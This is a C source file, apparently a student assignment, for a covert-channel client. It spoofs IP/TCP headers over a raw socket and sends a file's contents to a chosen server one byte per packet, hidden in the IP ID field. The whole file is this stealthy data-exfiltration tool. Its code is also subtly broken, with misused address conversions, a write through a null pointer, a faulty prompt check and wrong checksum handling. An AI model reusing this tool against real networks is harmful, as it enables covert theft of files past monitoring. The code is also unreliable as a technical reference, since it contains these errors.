//
//  client.c
//  
//	The client application implementation
//
//  
//	Created by Andrew Maledy on 2013-04-10.
//	COMP 8505 - Assignment 1
//
#include <stdio.h>			//just the basics...
#include <unistd.h>
#include <stdlib.h>
#include <getopt.h>			//library for getting command line arguments..great tool!
#include <string.h> //memset
#include <sys/socket.h>    //for socket ofcourse
#include <sys/ioctl.h> //for auto grabbing interface's ip
#include <net/if.h>

#include "tcp.h" //tcp header
#include "ip.h" //ip header
#include "client.h"

#define TH_SIN 0x06

void print_usage()
{
    printf("Usage: ./a.out -s <server ip> -c <client_ip> -p <port>\n");
    exit(1);
}

int main(int argc, char *argv[])
{

	
	int c, long_index=0; //for getopt
	char *server_ip, *client_ip, *filename, *iface; // client collected data
	char buffer[PCKT_LEN];
	int sport = 0;
	int dport = 80;
	int sfd;
	char ch; 
	FILE *file;
	//int long_index=0;
    static struct option long_options[] = {
        {"server-ip",      required_argument, 0,  's' },
        {"client-ip",      optional_argument, 0,  'c' },
        {"sport",      required_argument, 0,  'p' },
        {"dport",      required_argument, 0,  'q' },
        {"iface",      optional_argument, 0,  'i' },
        {"filename",      required_argument, 0,  'f' }

    };
	while ((c = getopt_long (argc, argv, "s:c:p:d:f:i:",long_options, &long_index)) != -1)
	         switch (c)
	           {
               case 's':
                   server_ip = optarg;
                   break;
               case 'c':
                   client_ip = optarg;
                   break;
               case 'p':
                   sport = atoi(optarg);
                   break;
               case 'f':
                   filename = optarg;
                   break;
               case 'd':
                   dport = atoi(optarg);
                   break;
               case 'i':
                    iface = optarg; 
                    break;
               case ':':
                    print_usage();
                    break;
               case '?':
                    print_usage();
                    break;
               default:
                    print_usage();
                    break;
	           }	           
	           
               if(( server_ip == NULL) || (client_ip == NULL ))
	           {
	           	print_usage();
	           	exit(EXIT_FAILURE);
	           }
	if(sport == 0)
		sport = 1+(int)(10000.0*rand()/(RAND_MAX+1.0));
	
    /*
    * If client_ip wasnt supplied, let's just figure it out...
    */
    if(client_ip == NULL)
    {

        if(iface ==  NULL) //did they give us an interface instead? if not...we'll take a gues
        {
            char *d_if = "en1";
            iface = d_if;

        }
        char choice;
        strcpy(client_ip, get_if_ip(iface));
        printf("IP (%s) found on Interface %s.", client_ip, iface);
        printf("This could be bad... are you sure you want to continue?");        
        fgets(&choice, sizeof(choice), stdin);
        if(!choice == 'y')
        {
            printf("Quitting...\n");
            exit(EXIT_SUCCESS);          
        }

    }
    printf("%s\n",iface);
	printf("Server IP: %s, Client IP: %s, Dest port: %d, Source. port: %d \n", server_ip, client_ip, dport, sport);

	//create the socket which we'll be writing to.	
	sfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);	
    if(sfd == -1)
    {
        //socket creation failed, probably not run as root...
        perror("Failed to create socket (check that you are root):");
        exit(1);
    }
 	char packet[4096]; //master packet buffer (we'll fill it in below)
 	memset (packet, 0, 4096);
 	//IP header
    struct ip *iph = (struct ip *) packet;
    //TCP header
    struct tcphdr *tcph = (struct tcphdr *) (packet + sizeof (struct ip)); //after the iphdr comes the tcphdr

    fill_iphdr(iph, client_ip, server_ip);
    fill_tcphdr(tcph, sport, dport);
    struct sockaddr_in sin; 
    struct pseudo_header pseudohdr;
 	
 	//address resolution
    sin.sin_family = AF_INET;
    sin.sin_port = htons(sport);
    sin.sin_addr.s_addr = inet_addr(server_ip);

    //Forge the TCP checksum
    pseudohdr.source_address = inet_addr( client_ip );
    pseudohdr.dest_address = sin.sin_addr.s_addr;
    pseudohdr.placeholder = 0;
    pseudohdr.protocol = IPPROTO_TCP;
    pseudohdr.tcp_length = htons(sizeof(struct tcphdr));
	memcpy(&pseudohdr , (char*) &pseudohdr , sizeof (struct pseudo_header));
    memcpy(&pseudohdr + sizeof(struct pseudo_header) , tcph , sizeof(struct tcphdr));
	//now set it with our pretend data ;)
	tcph->th_sum = calculate_checksum( (unsigned short*) &pseudohdr , iph->ip_len);
    
    int one = 1;
    const int *val = &one;
     
    if (setsockopt (sfd, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
    {
        perror("Error setting IP_HDRINCL");
        exit(0);
    }
    //Networking done... time so send file

	if((file=fopen(filename,"rb"))== NULL)
	 {
		printf("Can't open file %s \n",filename);
	 	exit(1);
	 }
	else while((ch=fgetc(file)) !=EOF)
	//file opened...look through each character and send the packet
	{
		
        iph->ip_id = ch; //the payload hidden in the id field
		tcph->th_seq = 1+(int)(10000.0*rand()/(RAND_MAX+1.0));
		if (sendto (sfd, &packet, iph->ip_len ,  0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
        {
            perror("sendto failed");
        }
        //Data send successfully
        else
        {
            //printf ("Packet Send. Character : %c" , iph->ip_id);
        }
	}

}

/*
* 	Fills in the a supplied IP header
*/
void fill_iphdr(struct ip* iph, char* source_ip, char* dest_ip)
{
    //Fill in the IP Header
    iph->ip_hl = 5;
    iph->ip_v = 4;
    iph->ip_tos = 0;
    iph->ip_len = sizeof (struct ip) + sizeof (struct tcphdr);
    iph->ip_id = htons(54321); //Id of this packet
    iph->ip_off = 0;
    iph->ip_ttl = 255;
    iph->ip_p = IPPROTO_TCP;
    iph->ip_sum = 0;      //Set to 0 before calculating checksum
    iph->ip_src =  inet_ntoa(source_ip);    //Spoof the source ip address
    iph->ip_dst =  inet_ntoa(dest_ip);
     

}
/*
* 	Fills in the a supplied TCP header
*/
void fill_tcphdr(struct tcphdr* tcph, int source_port, int dest_port)
{
    //Fill in TCP Header
    tcph->th_sport = htons(source_port);
    tcph->th_dport = htons(dest_port);
    tcph->th_seq = 0;
    tcph->th_ack = 0;
    tcph->th_off = 5;  //tcp header size
    tcph->th_flags = TH_SIN;
    tcph->th_win = htons (5840); /* maximum allowed window size */
    tcph->th_sum = 0; //leave checksum 0 now, filled later by pseudo header
    tcph->th_urp = 0;

}
/*
* Get the host's ip address (if a spoofed one isnt supplied)
*/
char * get_if_ip(char* iface)
{
 int fd;
 struct ifreq ifr;

 fd = socket(AF_INET, SOCK_DGRAM, 0);

 /* Get an IPv4 IP address */
 ifr.ifr_addr.sa_family = AF_INET;

 /* I want IP address attached to "eth0" */
 strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);

 ioctl(fd, SIOCGIFADDR, &ifr);

 close(fd);

 /* display result */
 return inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
  
}
//
// Calculate checksum
//
unsigned short calculate_checksum(unsigned short *buf, int len)
{
        unsigned long sum;
        for(sum=0; len>0; len--)
                sum += *buf++;
        sum = (sum >> 16) + (sum &0xffff);
        sum += (sum >> 16);
        return (unsigned short)(~sum);
}
